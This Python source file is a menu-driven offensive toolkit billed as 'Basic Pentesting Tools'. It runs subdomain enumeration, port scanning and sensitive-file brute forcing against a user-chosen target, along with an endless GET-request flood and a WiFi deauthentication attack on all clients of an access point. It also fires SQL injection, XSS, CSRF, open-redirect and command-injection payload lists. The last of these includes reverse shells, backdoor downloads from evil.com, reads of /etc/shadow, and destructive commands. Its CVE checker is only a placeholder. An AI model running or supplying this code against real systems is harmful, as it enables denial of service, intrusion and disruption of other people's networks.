import aiohttp
import asyncio
import socket
import ssl
from urllib.parse import urljoin, urlparse
import os
import dns.resolver
import dns.query
import dns.zone
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor

os.makedirs("output", exist_ok=True)

def display_banner():
    print("""
#####    #######  ##   ##   #####   ##   ##  #######  ######   
 ## ##    ##   #  ##   ##  ### ###  ##   ##   ##   #   ##  ##  
 ##  ##   ##      ##   ##  ##   ##  ##   ##   ##       ##  ##  
 ##  ##   ####     ## ##   ##   ##   ## ##    ####     #####   
 ##  ##   ##       ## ##   ##   ##   ## ##    ##       ## ##   
 ## ##    ##   #    ###    ### ###    ###     ##   #   ## ##   
#####    #######    ###     #####     ###    #######  #### ##   V4.3

 \033[1;32m Author: kdandy | Repo: https://github.com/kdandy/devtools\033[1;m
 \033[1;32m Basic Pentesting Tools \033[1;m
    """)

def display_menu():
    print("\n\033[1;32mSelect the features you want to run:\033[1;m")
    print("\033[1;32m1.\033[1;m Search for subdomains")
    print("\033[1;32m2.\033[1;m Spam GET requests to target URL")
    print("\033[1;32m3.\033[1;m Full Port Scan")
    print("\033[1;32m4.\033[1;m Directory and Sensitive File Bruteforcing")
    print("\033[1;32m5.\033[1;m SQL Injection Testing")
    print("\033[1;32m6.\033[1;m XSS Testing")
    print("\033[1;32m7.\033[1;m Header and SSL/TLS Inspection")
    print("\033[1;32m8.\033[1;m CSRF Testing")
    print("\033[1;32m9.\033[1;m Reverse DNS Lookup")
    print("\033[1;32m10.\033[1;m DNS Zone Transfer Testing")
    print("\033[1;32m11.\033[1;m Open Redirect Testing")
    print("\033[1;32m12.\033[1;m Command Injection Testing")
    print("\033[1;32m13.\033[1;m CVE Exploit Checker")
    print("\033[1;32m14.\033[1;m Scan WiFi Access Points")
    print("\033[1;32m15.\033[1;m Disconnect Clients from Access Point")
    print("\033[1;32m16.\033[1;m Exit")
    choice = input("\033[1;32mEnter options (1-16): \033[1;m")
    return choice

def url_validator(url):
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https')

def scan_access_points(interface):
    ap_list = set()

    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr3
            if bssid not in ap_list:
                ap_list.add((ssid, bssid))
                print(f"Found AP: SSID={ssid}, BSSID={bssid}")

    print("Scanning for access points...")
    sniff(iface=interface, prn=packet_handler, timeout=10)
    return list(ap_list)

def deauth_all_clients(ap_mac, interface="wlan0", count=100):
    broadcast_mac = "FF:FF:FF:FF:FF:FF"
    dot11 = Dot11(addr1=broadcast_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    print(f"Sending deauth packets to all clients on AP {ap_mac}...")
    for _ in range(count):
        sendp(packet, iface=interface, inter=0.1, verbose=False)
    print("All clients should now be disconnected.")

async def fetch_subdomains(domain):
    print("\nPress 'b' anytime to go back to the main menu.")
    if domain.lower() == "b":
        return
    crt_sh_url = f"https://crt.sh/?q=%25.{domain}&output=json"
    print(f"Fetching subdomains for {domain}...")
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(crt_sh_url) as response:
                if response.status == 200:
                    data = await response.json()
                    subdomains = {entry['name_value'] for entry in data}
                    print("\nFound subdomains:")
                    for subdomain in subdomains:
                        print(subdomain)
                    
                    with open("output/findsub.text", "w") as file:
                        file.write("\n".join(subdomains))
                    
                    print("\nSubdomains saved to output/findsub.text")
                else:
                    print(f"Failed to access crt.sh. Status code: {response.status}")
        except Exception as e:
            print(f"Error fetching subdomains: {e}")

async def spam_get_requests(url, requests_per_batch):
    print(f"Sending spam GET requests to {url} with {requests_per_batch} requests per batch.")
    if url.lower() == "b" or str(requests_per_batch).lower() == "b":
        return
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_single_get_request(session, url) for _ in range(requests_per_batch)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0)

async def send_single_get_request(session, url):
    try:
        async with session.get(url) as response:
            print(f"Accessed {url} with status {response.status}")
    except Exception as e:
        print(f"Error accessing {url}: {e}")

async def async_port_scan(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(0)
        try:
            sock.connect((ip, port))
            print(f"Port {port} is open on {ip}")
            return port
        except:
            return None

async def full_port_scan(domain):
    print(f"Starting full port scan on {domain}")
    if domain.lower() == "b":
        return
    ip = socket.gethostbyname(domain)
    open_ports = []
    tasks = [async_port_scan(ip, port) for port in range(1, 65535)]
    open_ports = [port for port in await asyncio.gather(*tasks) if port]
    
    if open_ports:
        with open("output/open_ports.txt", "w") as file:
            file.write(f"Open ports on {domain}:\n" + "\n".join(map(str, open_ports)))
        print("\nOpen ports saved to output/open_ports.txt")
    else:
        print("\nNo open ports found.")

async def bruteforce_directories_and_sensitive_files(url):
    print(f"Starting directory and file bruteforcing on {url}")
    if url.lower() == "b":
        return
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return
    
    directories_and_files = [
        "admin", "administrator", "dashboard", "config", "configs", "conf", "backup", "backups", "upload", "uploads",
        "private", "data", "database", "db", "log", "logs", "temp", "tmp", "cache", "debug", "include", "includes",
        "lib", "libs", "modules", "cgi-bin", "public", "files", "assets", "static", "src", "source", "environment",
        "env", "staging", "test", "tests", "sample", "samples", "dev", "development", "examples", "docs", "documentation",
        ".env", ".htaccess", ".git/", ".gitignore", ".npmrc", ".bash_history", ".zsh_history", "settings.py", "config.py",
        "config.json", "config.yaml", "config.yml", "database.sql", "db.sql", "db_backup.sql", "backup.sql", "secrets.json",
        "secret.key", "private.key", "server.key", "id_rsa", "id_rsa.pub", "docker-compose.yml", "Dockerfile",
        "wp-config.php", "local_settings.py", "web.config", "application.yml", "application.yaml", "parameters.yml",
        "parameters.yaml", "composer.json", "composer.lock", "package.json", "package-lock.json", "yarn.lock",
        "Pipfile", "Pipfile.lock", "requirements.txt", "Gemfile", "Gemfile.lock", "Makefile", "Procfile", "Rakefile",
        "error.log", "access.log", "debug.log", "install.log", "system.log", "error_log", "apache.log", "nginx.log",
        "mysql_error.log", "php_error.log", "install.log", "setup.log", "database.log", "debug.log",
        "backup.zip", "backup.tar.gz", "backup.tar", "site_backup.zip", "db_backup.zip", "database_backup.zip",
        "backup.bak", "backup_old.tar.gz", "old_backup.zip", "data_backup.zip", "site-backup.tar.gz", "config_backup.tar",
        "project_backup.tar", "app_backup.tar", "backup.sql.gz", "backup.sql.zip", "backup_db.tar.gz",
        "sitemap.xml", "sitemap_index.xml", "phpinfo.php", "readme.md", "README.txt", "LICENSE", "CHANGELOG.md",
        "CHANGELOG.txt", "UPGRADE.txt", "INSTALL.txt", "VERSION", "todo.txt", "TODO.md", "notes.txt", "NOTES.md",
        "help.md", "help.txt", "CONTRIBUTING.md", "AUTHORS", "SECURITY.md", "policy.md", "robots.txt",
        "site.xml", "rss.xml", "feeds.xml", "backup.xml", "env.json", "robots.json", "api_keys.txt", "secrets.txt",
        "authorized_keys", "known_hosts", "ssh_host_rsa_key", "ssh_host_dsa_key", "tls.key", "tls.crt", "cert.pem",
        "privkey.pem", "fullchain.pem", "cacert.pem", "client-cert.pem", "ssl-cert-snakeoil.pem", "server.crt"
    ]
    
    async with aiohttp.ClientSession() as session:
        found_items = []
        for item in directories_and_files:
            test_url = urljoin(url, item)
            try:
                async with session.get(test_url) as response:
                    if response.status == 200:
                        print(f"Found: {test_url}")
                        found_items.append(test_url)
                    else:
                        print(f"No access: {test_url}")
            except Exception as e:
                print(f"Error accessing {test_url}: {e}")
        
        if found_items:
            with open("output/found_items.txt", "w") as file:
                file.write("Found directories and files:\n" + "\n".join(found_items))
            print("\nResults saved to output/found_items.txt")
        else:
            print("\nNo directories or files found.")

async def sql_injection_testing(url):
    print(f"Starting SQL injection testing on {url}")
    if url.lower() == "b":
        return
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return

    sql_payloads = [
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1'#", "' OR 1=1--",
    "' OR 'x'='x", "' OR '1'='1' AND ''='", "'; DROP TABLE users; --", "'; SELECT SLEEP(5); --",
    "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT username, password FROM users --",
    "' UNION SELECT 1,2,3,4,5--", "' UNION SELECT ALL FROM information_schema.tables --",
    "' UNION SELECT table_name FROM information_schema.tables--", 
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b", "' AND ASCII(SUBSTRING((SELECT database()),1,1))=97 --",
    "' AND EXISTS(SELECT 1 FROM users WHERE username='admin') --", 
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
    "' OR SLEEP(5)--", "' OR IF(1=1, SLEEP(5), 0)--", "' AND IF((SELECT 'a' FROM users LIMIT 1)='a', SLEEP(5), 0) --",
    "' OR BENCHMARK(1000000,MD5(1))--", "' OR IF(EXISTS(SELECT * FROM users), SLEEP(5), 0) --",
    "' AND IF(LENGTH(database())>0,SLEEP(5),0)--", "' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64, SLEEP(5),0)--",
    "' AND 1=CONVERT(int, (SELECT @@version))--", "' OR 1=CAST((SELECT @@version) AS int)--",
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
    "' AND UPDATEXML(1,CONCAT(0x3a,version()),1)--", "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT user())))--",
    "' AND IF((SELECT user())='root', SLEEP(5), 0)--", "' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)--",
    "' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin') > 5, SLEEP(5), 0)--",
    "' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) = 97, SLEEP(5), 0) --",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)--",
    "' OR EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--",
    "' UNION SELECT 1, version(), 3--", "' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))abc)--"
    ]
    async with aiohttp.ClientSession() as session:
        for payload in sql_payloads:
            test_url = f"{url}{payload}"
            try:
                async with session.get(test_url) as response:
                    print(f"Tested SQL payload {payload} on {test_url} with status {response.status}")
                    content = await response.text()
                    if "syntax error" in content or "SQL" in content:
                        print(f"Potential SQL Injection vulnerability found with payload: {payload}")
            except Exception as e:
                print(f"Error testing SQL payload {payload}: {e}")

async def xss_testing(url):
    print(f"Starting XSS testing on {url}")
    if url.lower() == "b":
        return
    if not url_validator(url):
        print("Invalid URL. Please include http:// or https://")
        return

    xss_payloads = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>", "'\"><img src=x onerror=alert('XSS')>",
    "<script>alert(document.cookie)</script>", "<script>alert('XSS');</script>",
    "<svg onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')>",
    "<video><source onerror=\"javascript:alert('XSS')\">", "<input onfocus=alert('XSS') autofocus>",
    "<img src=x onerror=alert('XSS') />", "<img src=x onerror=\"alert('XSS')\" />",
    "<a href='javascript:alert(1)'>Click</a>", "<button onclick=alert('XSS')>Click</button>",
    "<div onmouseover=alert('XSS')>Hover over me!</div>", "<input onblur=alert('XSS')>",
    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E", "<svg%20onload=alert('XSS')>",
    "<img%20src%3Dx%20onerror%3Dalert('XSS')>", "<iframe%20src=javascript:alert('XSS')>",
    "<img src=x:alert(1) onerror=eval(src)>", "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
    "<body background=\"javascript:alert('XSS')\">", "<object data=\"javascript:alert('XSS')\">",
    "<details open ontoggle=alert('XSS')>XSS</details>", "<isindex action=javascript:alert('XSS')>",
    "<keygen autofocus onfocus=alert('XSS')>", "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<object type=\"text/html\" data=\"javascript:alert('XSS')\"></object>",
    "<a href='javascript:alert(1)'>XSS</a>", "<a href='JaVaScRiPt:alert(1)'>XSS</a>",
    "<iframe src=\"javascript:alert('XSS');\"></iframe>", "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">",
    "<script>document.write('<img src=x onerror=alert(1)>');</script>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>",
    "<script>window.location='javascript:alert(1)';</script>", "<script>history.pushState('', '', 'javascript:alert(1)')</script>",
    "<div><iframe src=javascript:alert('XSS')></iframe></div>", "<table background=javascript:alert('XSS')>",
    "<img dynsrc=javascript:alert('XSS')>", "<style>*{background:url('javascript:alert(1)')}</style>",
    "<img src=1 href=1 dynsrc=javascript:alert(1)>",
    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
    "<math><mtext></mtext><script>alert('XSS')</script></math>",
    "<xml><script><![CDATA[alert('XSS')]]></script></xml>",
    "<style>@import 'javascript:alert(1)';</style>", "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
    "<style>img[src=\"x\"]{background:url(\"javascript:alert('XSS')\")}</style>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>", "<scr<script>ipt>alert(1)//<scr<script>ipt>",
    "<sCrIpt>alert('XSS')</sCrIpt>", "<svg><sCrIpt>alert('XSS')</sCrIpt></svg>",
    "{\"data\":\"<img src=x onerror=alert(1)>\"}", "<script>const x=\"<img src=x onerror=alert(1)>\";</script>"
    ]
    
    async with aiohttp.ClientSession() as session:
        for payload in xss_payloads:
            test_url = f"{url}?q={payload}"
            try:
                async with session.get(test_url) as response:
                    print(f"Tested XSS payload {payload} on {test_url} with status {response.status}")
                    content = await response.text()
                    if payload in content:
                        print(f"Potential XSS vulnerability found with payload: {payload}")
            except Exception as e:
                print(f"Error testing XSS payload {payload}: {e}")

async def inspect_headers_and_ssl(domain):
    print(f"Starting header and SSL/TLS inspection on {domain}")
    if domain.lower() == "b":
        return
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"https://{domain}") as response:
                print("\nHTTP Headers:")
                for header, value in response.headers.items():
                    print(f"{header}: {value}")
        except Exception as e:
            print(f"Error fetching headers: {e}")
    
    context = ssl.create_default_context()
    with socket.create_connection((domain, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=domain) as ssock:
            cert = ssock.getpeercert()
            print("\nSSL Certificate Information:")
            for key, value in cert.items():
                print(f"{key}: {value}")

async def csrf_testing(url):
    print(f"Starting CSRF testing on {url}")
    if url.lower() == "b":
        return

    csrf_payloads = [
        {"username": "csrf_test", "password": "csrf_test"},
        {"user": "admin", "pass": "password123"},
        {"username": "admin", "password": "password", "csrf_token": ""},
        {"email": "test@example.com", "password": "12345", "remember": "1"},
        {"user_id": "1", "amount": "1000", "transfer": "send"},
        {"username": "root", "password": "toor"},
        {"username": "administrator", "password": "admin1234"},
        {"name": "csrf_attempt", "token": ""},
        {"account": "guest", "login": "true", "csrf": "null"},
        {"username": "user", "session": "abc123", "auth_token": ""},
        {"user_email": "user@example.com", "confirm": "yes", "csrf_token": ""},
        {"userid": "admin", "otp": "0000"},
        {"action": "delete_account", "confirm": "1", "csrf_token": ""},
        {"transfer_to": "2", "amount": "5000", "auth": ""},
        {"username": "superuser", "password": "supersecure", "remember_me": "1"},
        {"login": "yes", "auth_token": "12345abc", "user_id": "99"},
        {"reset_password": "true", "email": "reset@example.com", "csrf": ""},
        {"username": "testuser", "old_password": "oldpass", "new_password": "newpass", "csrf_token": ""},
        {"action": "disable_account", "confirm": "yes", "token": ""},
        {"login_as": "guest", "temporary_access": "true"},
        {"email": "csrf_user@example.com", "request_code": "true", "csrf_protection": ""},
        {"modify": "settings", "privacy": "off", "auth_key": ""},
        {"account_id": "123", "debit": "100", "submit": "confirm"},
        {"service": "premium", "activate": "yes", "csrf_token": ""},
    ]


    
    async with aiohttp.ClientSession() as session:
        for payload in csrf_payloads:
            try:
                async with session.post(url, data=payload) as response:
                    print(f"CSRF payload {payload} on {url} status {response.status}")
            except Exception as e:
                print(f"Error testing CSRF payload {payload}: {e}")

async def reverse_dns_lookup(ip):
    print(f"Starting reverse DNS lookup for {ip}")
    try:
        hostnames = socket.gethostbyaddr(ip)
        print(f"Hostnames associated with {ip}: {hostnames}")
    except Exception as e:
        print(f"Error in reverse DNS lookup for {ip}: {e}")

async def dns_zone_transfer(domain):
    print(f"Attempting DNS zone transfer for {domain}")
    try:
        ns_records = dns.resolver.resolve(domain, 'NS')
        for ns in ns_records:
            ns = str(ns).strip('.')
            try:
                zone = dns.query.xfr(ns, domain)
                z = dns.zone.from_xfr(zone)
                print(f"Zone Transfer succeeded for {domain} using NS {ns}")
                for name, node in z.nodes.items():
                    print(f"Found DNS entry: {name}")
                return
            except Exception as e:
                print(f"Failed zone transfer for NS {ns}: {e}")
    except Exception as e:
        print(f"DNS zone transfer attempt failed: {e}")

async def open_redirect_testing(url):
    print(f"Starting Open Redirect testing on {url}")
    payloads = [
    "/redirect?url=http://evil.com", "/out?link=http://evil.com",
    "/go?to=http://evil.com", "/forward?target=http://evil.com",
    "/next?u=http://evil.com", "/?return=http://evil.com",
    "/click?redirect=http://evil.com", "/image?url=http://evil.com",
    "/login?continue=http://evil.com", "/auth?redir=http://evil.com",
    "/validate?url=http://evil.com", "/view?src=http://evil.com",
    "/outbound?dest=http://evil.com", "/forwarding?to=http://evil.com",
    "/jump?destination=http://evil.com", "/link?next=http://evil.com",
    "/track?go=http://evil.com", "/site?visit=http://evil.com",
    "/load?uri=http://evil.com", "/transfer?url=http://evil.com",
    "/action?redirect_uri=http://evil.com", "/confirm?url=http://evil.com",
    "/api?ref=http://evil.com", "/portal?url=http://evil.com",
    "/redir?path=http://evil.com"
    ]
    
    async with aiohttp.ClientSession() as session:
        for payload in payloads:
            test_url = urljoin(url, payload)
            try:
                async with session.get(test_url, allow_redirects=True) as response:
                    if "evil.com" in str(response.url):
                        print(f"Potential Open Redirect found: {test_url} redirected to {response.url}")
            except Exception as e:
                print(f"Error testing Open Redirect payload {payload}: {e}")

async def command_injection_testing(url):
    print(f"Starting Command Injection testing on {url}")
    payloads = [
    "; ls", "| whoami", "&& uname -a", "`id`", "$(cat /etc/passwd)",
    "| nc -e /bin/bash 10.10.10.10 4444", "&& curl http://evil.com",
    "`nc -nv 192.168.1.1 4444`", "$(wget http://malicious-site.com)",
    "| sleep 10", "; cat /etc/shadow", "&& touch /tmp/pwned",
    "| ping -c 10 192.168.1.1", "; curl -o /tmp/backdoor http://evil.com/backdoor",
    "| echo hacked > /tmp/hacked.txt", "`/bin/sh -i`", "| ps aux", "; kill -9 1",
    "`curl http://attack-server`", "| echo Exploited > /var/tmp/pwned",
    "&& mv /bin/bash /bin/shadow-backup", "`echo owned`", "| tee /etc/issue"
    ]
    async with aiohttp.ClientSession() as session:
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                async with session.get(test_url) as response:
                    print(f"Tested payload: {payload}, Status: {response.status}")
                    content = await response.text()
                    if "root" in content or "uid=" in content:
                        print(f"Potential Command Injection vulnerability with payload: {payload}")
            except Exception as e:
                print(f"Error testing payload {payload}: {e}")

async def cve_exploit_checker(domain):
    print(f"Checking CVEs for {domain}")
    cve_list = [
    "CVE-2021-44228",
    "CVE-2022-22965",
    "CVE-2017-5638",
    "CVE-2018-7600",
    "CVE-2019-19781",
    "CVE-2019-0708",
    "CVE-2020-1472",
    "CVE-2018-11776",
    "CVE-2021-34527",
    "CVE-2018-13379",
    "CVE-2020-0796",
    "CVE-2019-11510",
    "CVE-2017-11882",
    "CVE-2020-5902",
    "CVE-2019-18935",
    "CVE-2018-1002105",
    "CVE-2022-1388",
    ]

    for cve in cve_list:
        print(f"Checking {cve}...")
        # Simulate a check; integrate CVE vulnerability databases or APIs here
        print(f"{cve} check completed. (Implement real checks as needed)")

async def main():
    display_banner()
    while True:
        choice = display_menu()

        if choice == "1":
            domain = input("Enter the target domain (e.g., example.com): ")
            await fetch_subdomains(domain)
        elif choice == "2":
            url = input("Enter target URL: ")
            requests_per_batch = input("Enter the number of requests per batch: ")
            if requests_per_batch.lower() == "b":
                continue
            await spam_get_requests(url, int(requests_per_batch))
        elif choice == "3":
            domain = input("Enter the target domain for port scan (e.g., example.com): ")
            await full_port_scan(domain)
        elif choice == "4":
            url = input("Enter the target URL for directory and sensitive file bruteforcing (e.g., https://example.com/): ")
            await bruteforce_directories_and_sensitive_files(url)
        elif choice == "5":
            url = input("Enter the target URL for SQL Injection testing (e.g., https://example.com/search?q=): ")
            await sql_injection_testing(url)
        elif choice == "6":
            url = input("Enter the target URL for XSS testing (e.g., https://example.com): ")
            await xss_testing(url)
        elif choice == "7":
            domain = input("Enter the target domain for header and SSL/TLS inspection (e.g., example.com): ")
            await inspect_headers_and_ssl(domain)
        elif choice == "8":
            url = input("Enter the target URL for CSRF testing (e.g., https://example.com/login): ")
            await csrf_testing(url)
        elif choice == "9":
            ip = input("Enter the IP address for reverse DNS lookup: ")
            await reverse_dns_lookup(ip)
        elif choice == "10":
            domain = input("Enter the domain for DNS zone transfer testing: ")
            await dns_zone_transfer(domain)
        elif choice == "11":
            url = input("Enter the URL for Open Redirect testing (e.g., https://example.com): ")
            await open_redirect_testing(url)
        elif choice == "12":
            url = input("Enter the URL for Command Injection testing (e.g., https://example.com): ")
            await command_injection_testing(url)
        elif choice == "13":
            domain = input("Enter the domain for CVE exploit checking (e.g., example.com): ")
            await cve_exploit_checker(domain)
        elif choice == "14":
            iface = input("Enter your monitor mode interface (e.g., wlan0mon): ")
            ap_list = scan_access_points(iface)
            print("\nAccess Points Found:")
            for i, (ssid, bssid) in enumerate(ap_list, 1):
                print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
        elif choice == "15":  # Menambah opsi deauth client
            iface = input("Enter your monitor mode interface (e.g., wlan0mon): ")
            ap_list = scan_access_points(iface)
            print("\nAccess Points Found:")
            for i, (ssid, bssid) in enumerate(ap_list, 1):
                print(f"{i}. SSID: {ssid}, BSSID: {bssid}")
            selected_index = int(input("Enter the number of the target AP to disconnect clients: ")) - 1
            target_ap_mac = ap_list[selected_index][1]
            deauth_all_clients(target_ap_mac, iface)
        elif choice == "16":
            print("Exiting...")
            break
        else:
            print("Invalid selection. Please choose a valid option.")

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("The program was terminated by the user.")
